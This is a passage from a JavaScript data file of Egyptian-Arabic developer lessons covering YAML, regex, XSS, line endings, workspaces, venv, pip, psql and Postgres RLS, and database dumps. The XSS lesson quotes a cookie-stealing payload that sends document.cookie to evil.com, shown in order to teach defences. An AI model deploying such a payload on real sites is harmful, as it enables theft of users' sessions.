          try: "Nginx المستوى ٣: [[basic auth]]"
        },
        {
          cmd: "YAML",
          title: "إعدادات بالمسافات",
          desc: "صيغة إعدادات مبنية على المسافات: [[key: value]]، والقوايم بـ [[- ]]، والتداخل بمسافتين. GitHub Actions و docker compose كلهم YAML. tab بدل مسافات أو مسافة ناقصة بتكسر الملف كله.",
          teach: R`## القواعد الأساسية

~~~text
services:            ← key وتحته حاجات
  web:               ← مسافتين = جوه services
    image: nginx     ← key: value
    ports:
      - "8080:80"    ← "- " = عنصر في لستة
~~~

- المسافات هي اللي بتحدد مين جوه مين. **tab ممنوع**.
- [[key: value]] لازم مسافة بعد النقطتين.

## المثال: [[docker compose config -q && echo ok]]

- [[docker compose config]] بيقرا [[compose.yaml]] ويتأكد إنه سليم، و [[-q]] (quiet) من غير ما يطبع الملف.
- [[&& echo ok]] لو سليم.

جرّبنا ٣ نسخ من نفس الملف (Docker على ويندوز):

~~~text سليم
ok
~~~

~~~text tab بدل المسافات
yaml: while scanning for the next token at line 3: found character that cannot start any token
~~~

~~~text مسافة ناقصة قبل ports
yaml: while parsing a block mapping at line 1, column 3: line 3, column 4: did not find expected key
~~~

رقم السطر في الرسالة بيقولك فين، وغالبًا الغلطة في السطر ده أو اللي قبله.

> الخلاصة: YAML بايظ = غالبًا مسافة أو tab، و المحرر اللي بيوريك المسافات بيوفر وقت.`,
          example: "docker compose config -q && echo ok",
          try: "GitHub Actions المستوى ١: [[ci.yml]]"
        },
        {
          cmd: "regex",
          title: "نمط البحث",
          desc: "لغة صغيرة لوصف نص: [[^]] بداية السطر، [[$]] آخره، [[.]] أي حرف، [[*]] تكرار. grep و sed و Nginx location و JavaScript كلهم بيفهموها، بفروق صغيرة بينهم (زي -E في grep).",
          teach: R`## الرموز الأساسية

| الرمز | معناه | مثال |
|---|---|---|
| [[.]] | أي حرف واحد | [[a.c]]: abc و a1c |
| [[*]] | اللي قبله صفر مرة أو أكتر | [[ab*]]: a و abbb |
| [[^]] | أول السطر | [[^ERROR]] |
| [[$]] | آخر السطر | [[\.js$]] |
| [0-9] (بين أقواس مربعة) | حرف واحد من الرينج | رقم واحد |

## المثال

~~~bash
grep -E " 50[0-9] " /var/log/nginx/access.log | tail -3
~~~

- [[-E]] (extended): regex كاملة من غير ما تحط [[\]] قبل [[+]] و [[|]] و [[()]].
- [[" 50[0-9] "]]: مسافة، و [[50]]، وأي رقم، ومسافة. يعني status من 500 لـ 509.
- [[tail -3]] آخر ٣.

جرّبناه على لوج تجربة فيه 200 و 502 و 500 و 404 (ubuntu:24.04):

~~~text الناتج
1.2.3.4 - - [07/Oct/2026:10:00:02 +0000] "GET /api HTTP/1.1" 502 166
5.6.7.8 - - [07/Oct/2026:10:00:03 +0000] "POST /login HTTP/1.1" 500 30
~~~

المسافتين حوالين الرقم مهمين: من غيرهم النمط هيلقط كمان حجم رد زي [[1504]].

> الخلاصة: ابدأ بنمط بسيط وجرّبه على سطور حقيقية، وبعدين ضيّقه.`,
          example: R`grep -E " 50[0-9] " /var/log/nginx/access.log | tail -3`,
          try: "bash المستوى ٢: [[grep]]"
        },
        {
          cmd: "XSS",
          title: "كود في صفحة غيرك",
          desc: "المهاجم يحط JavaScript في داتا (كومنت أو اسم) وموقعك يعرضها كـ HTML، فيتنفذ في متصفح كل زائر ويسرق الكوكي أو يعمل طلبات باسمه. الحل: اعرض كنص ([[textContent]])، و CSP.",
          teach: R`## إزاي بيحصل

~~~text
اسم المستخدم:  <img src=x onerror="fetch('//evil.com?c='+document.cookie)">
~~~

لو صفحتك عرضت الاسم ده بـ [[innerHTML]]، المتصفح بيعتبره HTML وبينفّذ الكود في صفحة كل حد بيشوفه، بصلاحيات موقعك.

## الحل

1. اعرض بيانات المستخدم كنص: [[textContent]] بدل [[innerHTML]]. وفي React الـ [[{name}]] بيعمل كده لوحده، إلا [[dangerouslySetInnerHTML]].
2. CSP (Content Security Policy): header بيقول للمتصفح السكربتات مسموحة من فين بس، فحتى لو حاجة اتحقنت متتنفذش.

## المثال

~~~bash
curl -sI https://example.com | grep -i content-security-policy
~~~

بيدوّر على الـ header في الرد. [[example.com]] مفيهوش، فالأمر مطبعش حاجة. وعلى [[github.com]]:

~~~text الناتج (Git Bash على ويندوز، مقصوص)
Content-Security-Policy: default-src 'none'; base-uri 'self'; child-src github.githubassets.com ...
~~~

[[default-src 'none']] يعني ممنوع كل حاجة إلا اللي متسمّي بعد كده.

> الخلاصة: أي داتا من المستخدم نص مش HTML، و CSP طبقة حماية تانية.`,
          example: "curl -sI https://example.com | grep -i content-security-policy",
          try: "الأمان المستوى ٢: [[3. XSS]]"
        },
        {
          cmd: "CRLF / LF",
          title: "نهاية السطر",
          desc: R`ويندوز بينهي السطر بحرفين [[\r\n]]، ولينكس بحرف واحد [[\n]]. سكربت bash اتكتب على ويندوز بيطلع «cannot execute: required file not found» (أو «bad interpreter» في النسخ الأقدم) أو [[$'\r']]. الحل [[.gitattributes]] أو [[dos2unix]].`,
          teach: R`## الحرفين

| | الحروف | اسمها |
|---|---|---|
| لينكس والماك | [[\n]] | LF (Line Feed) |
| ويندوز | [[\r\n]] | CRLF (Carriage Return + Line Feed) |

bash بيعتبر [[\r]] جزء من الكلام، فـ [[cd /tmp]] بقت [[cd /tmp\r]].

## المثال: [[file deploy.sh]]

[[file]] بيبص جوه الملف ويقول نوعه. عملنا سكربت بـ CRLF وجرّبناه في ubuntu:24.04:

~~~text file deploy.sh
deploy.sh: Bourne-Again shell script, ASCII text executable, with CRLF line terminators
~~~

[[with CRLF line terminators]] هي المشكلة. ولما شغّلناه:

~~~text ./deploy.sh
bash: ./deploy.sh: cannot execute: required file not found
~~~

~~~text bash deploy.sh
deploy.sh: line 2: cd: $'/tmp\r': No such file or directory
~~~

الأولى: الكيرنل بيدوّر على [[/bin/bash\r]] ومش لاقيه (bash 5.2 بيقولها كده، والنسخ الأقدم بتقول [[bad interpreter]]). والتانية: [[$'\r']] هو الحرف الزيادة.

> الخلاصة: [[*.sh text eol=lf]] في [[.gitattributes]]، أو [[dos2unix deploy.sh]] للملف الموجود.`,
          example: "file deploy.sh",
          try: "WSL المستوى ٢: [[Git و line endings]]"
        },
        {
          cmd: "monorepo / workspace",
          title: "كذا مشروع في ريبو واحد",
          desc: "ريبو واحد فيه كذا باكدج: api و web وكود مشترك. الـ workspace (npm أو pnpm) بيسطّب الكل من الجذر مرة واحدة، ويربط الباكدج المشتركة لينك بدل ما يجيبها من npm. و [[workspace:*]] في package.json معناها «النسخة اللي هنا في الريبو».",
          teach: R`## الفكرة

~~~text
my-app/
  pnpm-workspace.yaml
  package.json
  apps/api/      ← باكدج
  apps/web/      ← باكدج
  packages/shared/   ← كود مشترك
~~~

ريبو واحد، و [[pnpm install]] مرة واحدة في الجذر بيسطّب للكل. ولو [[web]] محتاج [[shared]]، بيتربط لينك للفولدر اللي جنبه، فأي تعديل يبان على طول من غير نشر على npm.

## المثال: [[cat pnpm-workspace.yaml]]

[[cat]] بيطبع الملف. ده الملف اللي بيقول لـ pnpm فين الباكدجات:

~~~text الناتج (ملف تجربة)
packages:
  - "apps/*"
  - "packages/*"
~~~

- [[packages:]] لستة أماكن.
- [[apps/*]] كل فولدر جوه [[apps]] باكدج.

وفي [[package.json]] بتاع [[web]] بتكتب [["@my/shared": "workspace:*"]] يعني «خدها من الريبو». ومع npm نفس الفكرة بحقل [[workspaces]] جوه [[package.json]] بدل الملف ده.

> الخلاصة: workspace = تسطيب واحد ولينكات بين الباكدجات بدل نشرها.`,
          example: "cat pnpm-workspace.yaml",
          try: "Node المستوى ٢: [[pnpm-workspace.yaml و workspace:*]]"
        },
        {
          cmd: "venv",
          title: "بيئة Python معزولة",
          desc: "فولدر جوه المشروع ([[.venv]]) فيه Python ومكتبات المشروع ده بس، فكل مشروع ليه نسخه من غير ما يبوّظ التاني أو النظام. بعد [[activate]]، [[python]] و [[pip]] بيشاوروا عليه، وبيظهر [[(.venv)]] في الـ prompt.",
          teach: R`## ليه

[[pip install]] من غير venv بيسطّب للـ Python بتاع النظام كله، فمشروع محتاج requests 2.28 وتاني محتاج 2.32 يتخانقوا. الـ venv فولدر فيه Python خاص بالمشروع ومكتباته بس.

## المثال

~~~bash
python3 -m venv .venv && . .venv/bin/activate && which python
~~~

| الحتة | بتعمل إيه |
|---|---|
| [[python3 -m venv .venv]] | [[-m]] شغّل الموديول [[venv]]، يعمل البيئة في فولدر [[.venv]] |
| [[. .venv/bin/activate]] | [[.]] (زي [[source]]) شغّل السكربت ده جوه الشيل الحالي، فيعدّل PATH |
| [[which python]] | قولي [[python]] بقى بيشاور على فين |

جرّبناه في [[python:3.13-slim]]:

~~~text قبل activate
/usr/local/bin/python
~~~

~~~text بعد activate
/p/.venv/bin/python
~~~

[[activate]] حط [[.venv/bin]] في أول PATH. وعلى ويندوز: [[.venv\Scripts\Activate.ps1]] بدل [[bin/activate]].

> الخلاصة: venv لكل مشروع، و [[.venv]] في [[.gitignore]].`,
          example: "python3 -m venv .venv && . .venv/bin/activate && which python",
          try: "Python المستوى ١: [[python3 -m venv .venv]]"
        },
        {
          cmd: "pip / requirements.txt",
          title: "مكتبات Python",
          desc: "pip مدير باكدجات Python، زي npm. [[requirements.txt]] لستة مكتبات المشروع، مكتبة في كل سطر وغالبًا بنسختها، زي dependencies في package.json. بتتسطّب كلها جوه الـ venv بأمر واحد.",
          teach: R`## الفكرة

| Node | Python |
|---|---|
| npm | pip |
| package.json | requirements.txt |
| node_modules | .venv |

[[requirements.txt]] ملف نص، مكتبة في كل سطر، و [[==]] للنسخة بالظبط:

~~~text requirements.txt
requests==2.32.3
~~~

## المثال: [[pip install -r requirements.txt]]

[[-r]] (requirement file): سطّب كل اللي في الملف ده. جرّبناه جوه venv في [[python:3.13-slim]]، وبعدها [[pip list]]:

~~~text الناتج
Package            Version
------------------ ---------
certifi            2026.7.22
charset-normalizer 3.5.2
idna               3.20
pip                26.2.1
requests           2.32.3
urllib3            2.8.0
~~~

طلبنا مكتبة واحدة، ونزل معاها ٤ هي محتاجاهم. و [[pip freeze > requirements.txt]] بيكتب كل اللي متسطّب بنسخه.

> الخلاصة: فعّل الـ venv الأول، وبعدين [[pip install -r]].`,
          example: "pip install -r requirements.txt",
          try: "Python المستوى ١: [[pip install -r requirements.txt]]"
        },
        {
          cmd: "ON_ERROR_STOP",
          title: "psql يقف عند أول غلطة",
          desc: "psql افتراضيًا لو سطر في ملف SQL فشل، بيطبع error ويكمّل اللي بعده، وفي الآخر يرجع exit code 0، فالسكربت يفتكر كل حاجة نجحت. [[-v ON_ERROR_STOP=1]] بيخليه يقف ويرجع رقم فشل، وده لازم في أي migration أو سكربت.",
          teach: R`## المشكلة

ملف SQL فيه ٣ أوامر، والتاني غلط. psql افتراضيًا بيطبع الـ error ويكمّل التالت، وفي الآخر يرجع exit code 0، فالسكربت أو CI يفتكر إن كله تمام.

## المثال

~~~bash
psql "$DATABASE_URL" -v ON_ERROR_STOP=1 -f migration.sql
~~~

- [[$DATABASE_URL]] رابط الاتصال (يوزر وباسورد وسيرفر وقاعدة)، بين علامات تنصيص عشان أي رموز فيه.
- [[-v ON_ERROR_STOP=1]] اعمل المتغير ده جوه psql: أول error وقّف.
- [[-f migration.sql]] نفّذ الملف.

جرّبنا ملف: [[CREATE TABLE a]]، وبعده [[INSERT]] بقيمة غلط، وبعده [[CREATE TABLE b]] (في [[postgres:16-alpine]]):

| | من غير | مع [[ON_ERROR_STOP=1]] |
|---|---|---|
| التالت اتنفذ؟ | أيوه، [[b]] اتعمل | لأ |
| exit code | [[0]] | [[3]] |

~~~text مع ON_ERROR_STOP=1
CREATE TABLE
psql:/m.sql:2: ERROR:  invalid input syntax for type integer: "oops"
LINE 1: INSERT INTO a VALUES ('oops');
                              ^
~~~

بس خد بالك: [[a]] فضل موجود، لأن اللي قبل الغلط اتنفذ. لو عايز الكل أو ولا حاجة ضيف [[--single-transaction]] (أو [[-1]]).

> الخلاصة: [[-v ON_ERROR_STOP=1]] في أي سكربت، ومعاه [[-1]] لو الملف لازم يتنفذ كله أو لأ.`,
          example: R`psql "$DATABASE_URL" -v ON_ERROR_STOP=1 -f migration.sql`,
          try: "PostgreSQL المستوى ١: [[تشغيل SQL من ملف]]"
        },
        {
          cmd: "RLS",
          title: "صلاحيات على مستوى الصف",
          desc: "Row Level Security: policies جوه Postgres بتحدد كل يوزر يقرا ويكتب أنهي صفوف. في Supabase الواجهة بتكلّم القاعدة مباشرة، فـ RLS هي الحماية الوحيدة. جدول من غيرها أي حد معاه الـ anon key يقراه كله.",
          teach: R`## الفكرة

عادةً الصلاحيات على الجدول كله: تقرا [[orders]] أو لأ. RLS (Row Level Security) بتضيف شرط على كل صف، زي ما يكون Postgres بيحط [[WHERE user_id = اليوزر الحالي]] لوحده في كل استعلام:

~~~text
ALTER TABLE orders ENABLE ROW LEVEL SECURITY;
CREATE POLICY own_orders ON orders USING (user_id = auth.uid());
~~~

([[auth.uid()]] دالة في Supabase بترجع رقم اليوزر اللي داخل.)

## المثال

~~~bash
psql -c "SELECT tablename, rowsecurity FROM pg_tables WHERE schemaname = 'public';"
~~~

- [[pg_tables]] كتالوج فيه كل الجداول، و [[rowsecurity]] عمود: RLS متفعّلة ولا لأ.
- [[WHERE schemaname = 'public']] جداولك بس، مش جداول النظام.

جرّبناه بجدولين، [[users]] فعّلنا عليه RLS و [[posts]] لأ:

~~~text الناتج في postgres:16-alpine
 tablename | rowsecurity
-----------+-------------
 users     | t
 posts     | f
(2 rows)
~~~

[[t]] = true. أي [[f]] في مشروع Supabase يعني الجدول ده مقروء لأي حد معاه الـ anon key. وخد بالك: RLS متفعّلة من غير أي policy = محدش يقرا حاجة (غير صاحب الجدول).

> الخلاصة: في Supabase كل جدول [[t]] وليه policies، من غير استثناء.`,
          example: R`psql -c "SELECT tablename, rowsecurity FROM pg_tables WHERE schemaname = 'public';"`,
          try: "PostgreSQL المستوى ٣: [[Row Level Security]]"
        },
        {
          cmd: "dump / restore",
          title: "نسخة من القاعدة ورجوعها",
          desc: "الـ dump ملف فيه القاعدة (الهيكل والبيانات) في لحظة معينة: [[pg_dump]] لـ Postgres و [[mongodump]] لـ Mongo. الـ restore بيرجّعه في قاعدة فاضية أو على سيرفر تاني. باك أب عمرك ما جرّبت ترجّعه متعتمدش عليه.",
          teach: R`## الفكرة

~~~text
القاعدة  ── pg_dump ──>  mydb.dump  ── pg_restore ──>  قاعدة تانية
~~~

الـ dump صورة من القاعدة في لحظة: الجداول والبيانات والـ indexes. بتستخدمه للباك أب، أو تنقل لسيرفر جديد، أو تجيب نسخة من الإنتاج للتجربة.

## المثال: [[pg_dump -U postgres -d mydb -Fc -f mydb.dump]]

| الحتة | معناها |
|---|---|
| [[-U postgres]] | اليوزر |
| [[-d mydb]] | القاعدة |
| [[-Fc]] | Format custom: مضغوط، وبيترجع بـ [[pg_restore]] |
| [[-f mydb.dump]] | اسم الملف |

جرّبناه في [[postgres:16-alpine]] على قاعدة فيها جدولين، ورجّعناه في قاعدة جديدة:

~~~bash
pg_dump -U postgres -d postgres -Fc -f /tmp/mydb.dump
createdb -U postgres copy
pg_restore -U postgres -d copy /tmp/mydb.dump
psql -U postgres -d copy -c "\dt"
~~~

~~~text الناتج
         List of relations
 Schema | Name  | Type  |  Owner
--------+-------+-------+----------
 public | posts | table | postgres
 public | users | table | postgres
(2 rows)
~~~

الجدولين رجعوا في [[copy]]. والملف كان ٢٥٩٣ byte بس. ولـ MongoDB نفس الفكرة: [[mongodump]] و [[mongorestore]].

> الخلاصة: الباك أب مش باك أب لحد ما تجرّب ترجّعه زي ما عملنا هنا.`,
          example: "pg_dump -U postgres -d mydb -Fc -f mydb.dump",
          try: "VPS المستوى ٣: [[pg_dump]]"
        }
      ]
    }
]);
